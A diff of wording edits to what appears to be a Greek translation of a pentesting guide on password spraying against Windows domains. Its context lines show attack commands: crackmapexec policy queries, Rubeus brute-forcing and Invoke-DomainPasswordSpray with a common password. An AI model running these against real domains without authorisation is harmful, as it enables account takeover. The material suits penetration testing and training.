@@ -23,7 +23,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 
 ## **Password Spraying**
 
-Μόλις βρείτε αρκετά **έγκυρα ονόματα χρηστών**, μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς πρόσβασης** (έχετε υπόψη την πολιτική κωδικών πρόσβασης του περιβάλλοντος) με καθέναν από τους ανακαλυφθέντες χρήστες.\
+Αφού βρείτε αρκετά **έγκυρα ονόματα χρηστών**, μπορείτε να δοκιμάσετε τους πιο **συνηθισμένους κωδικούς πρόσβασης** (έχετε υπόψη την πολιτική κωδικών πρόσβασης του περιβάλλοντος) με καθέναν από τους ανακαλυφθέντες χρήστες.\
 Κατά **προεπιλογή**, το **ελάχιστο** **μήκος** **κωδικού πρόσβασης** είναι **7**.
 
 Λίστες με κοινά ονόματα χρηστών θα μπορούσαν επίσης να είναι χρήσιμες: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
@@ -32,7 +32,7 @@ Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and 
 
 ### Get password policy
 
-Αν έχετε κάποια διαπιστευτήρια χρήστη ή ένα shell ως χρήστης τομέα, μπορείτε να **πάρετε την πολιτική κωδικών πρόσβασης με**:
+Αν έχετε κάποια διαπιστευτήρια χρήστη ή ένα shell ως χρήστης τομέα μπορείτε να **πάρετε την πολιτική κωδικών πρόσβασης με**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -87,7 +87,7 @@ done
 ```
 #### Από τα Windows
 
-* Με την έκδοση του [Rubeus](https://github.com/Zer1t0/Rubeus) που περιέχει το brute module:
+* Με την έκδοση [Rubeus](https://github.com/Zer1t0/Rubeus) που περιέχει το brute module:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -95,7 +95,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-* Με το [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει χρήστες από το domain από προεπιλογή και θα πάρει την πολιτική κωδικών πρόσβασης από το domain και θα περιορίσει τις προσπάθειες σύμφωνα με αυτήν):
+* Με το [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Μπορεί να δημιουργήσει χρήστες από το domain από προεπιλογή και θα πάρει την πολιτική κωδικών πρόσβασης από το domain και θα περιορίσει τις προσπάθειες ανάλογα με αυτήν):
 ```powershell
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
